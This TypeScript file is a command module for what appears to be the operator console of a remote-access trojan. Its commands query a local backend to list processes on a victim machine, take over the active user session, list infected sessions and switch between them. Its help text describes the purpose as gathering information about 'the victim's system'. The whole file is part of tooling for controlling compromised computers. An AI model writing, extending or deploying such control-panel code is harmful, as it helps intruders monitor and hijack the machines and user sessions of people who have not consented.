import { Command } from '@/Interfaces/Command';
import { Module } from '@/Interfaces/Module';

interface Process {
    name: string;
    pid: string;
    owner: string;
};

const listProcesses: Command = {
    execute: async (user, args, addOutput) => {
        try {
            const response = await fetch("http://localhost:8000/api/modules/system/list-processes?id=" + user.uuid);
            if (!response.ok) {
                const errorData = await response.json();
                addOutput(`Failed to list processes: ${errorData.detail || response.statusText}`);
                return;
            }
            
            const processData: Process[] = JSON.parse(await response.text());
            
            // Find the longest entry in each column including headers
            const maxName = Math.max('NAME'.length, ...processData.map(p => p.name.length));
            const maxPid = Math.max('PID'.length, ...processData.map(p => p.pid.length));
            const maxOwner = Math.max('OWNER'.length, ...processData.map(p => p.owner.length));
            
            // Create a row with exact dash padding
            const createRow = (name: string, pid: string, owner: string) => {
                const nameFill = "-".repeat(maxName - name.length);
                const pidFill = "-".repeat(maxPid - pid.length);
                const ownerFill = "-".repeat(maxOwner - owner.length);
                return `| ${name}${nameFill} | ${pid}${pidFill} | ${owner}${ownerFill} |`;
            };
            
            // Create separator with exact spacing
            const separator = `+${"-".repeat(maxName + 2)}+${"-".repeat(maxPid + 2)}+${"-".repeat(maxOwner + 2)}+`;
            
            // Output table
            addOutput(separator);
            addOutput(createRow('NAME', 'PID', 'OWNER'));
            addOutput(separator);
            
            // Output each process
            for (const process of processData) {
                addOutput(createRow(process.name, process.pid, process.owner));
            }
            
            addOutput(separator);
            
        } catch (error) {
            addOutput(`Failed to list processes: ${error}`);
            return;
        }
    },
    help: "List all running processes. Usage: /system/listProcesses"
};

const useActiveSession: Command = {
    execute: async (user, args, addOutput) => {
        try {
            const response = await fetch("http://localhost:8000/api/modules/system/use-active-session?id=" + user.uuid);
            if (!response.ok) {
                const errorData = await response.json();
                addOutput(`Failed to use active session: ${errorData.detail || response.statusText}`);
                return;
            }
            addOutput("Active session is now in use.");
        } catch (error) {
            addOutput(`Failed to use active session: ${error}`);
            return;
        }
    },
    help: "Use the active user session connected to the machine. Usage: /system/useActiveSession"
}

const listOwnedSessions: Command = {
    execute: async (user, args, addOutput) => {
        try {
            const response = await fetch("http://localhost:8000/api/modules/system/sessions?id=" + user.uuid);
            if (!response.ok) {
                const errorData = await response.json();
                addOutput(`Failed to list owned sessions: ${errorData.detail || response.statusText}`);
                return;
            }
            const sessionData = JSON.parse(await response.text());
            addOutput("Active session: " + sessionData.active_session);
            addOutput("Owned sessions: ");
            
            for (const session of sessionData.sessions) {
                addOutput(session);
            }

            addOutput("You can change the active session using /system/changeSession :USERNAME=<session>");
            
        } catch (error) {
            addOutput(`Failed to list owned sessions: ${error}`);
            return;
        }
    },
    help: "List all sessions infected in this machine. Usage: /system/listOwnedSessions"
}

const changeSession: Command = {
    execute: async (user, args, addOutput) => {
        try {
            const response = await fetch("http://localhost:8000/api/modules/system/change-session?id=" + user.uuid + "&session=" + args.USERNAME);
            if (!response.ok) {
                const errorData = await response.json();
                addOutput(`Failed to change session: ${errorData.detail || response.statusText}`);
                return;
            }
            addOutput("Session changed successfully.");
        } catch (error) {
            addOutput(`Failed to change session: ${error}`);
            return;
        }
    },
    help: "Change the active session. Usage: /system/changeSession <session>"
}

export const systemModule: Module = {
    commands: {
        listProcesses,
        useActiveSession,
        listOwnedSessions,
        changeSession
    },
    help: `This module is to get informations about the victim's system.\n`
};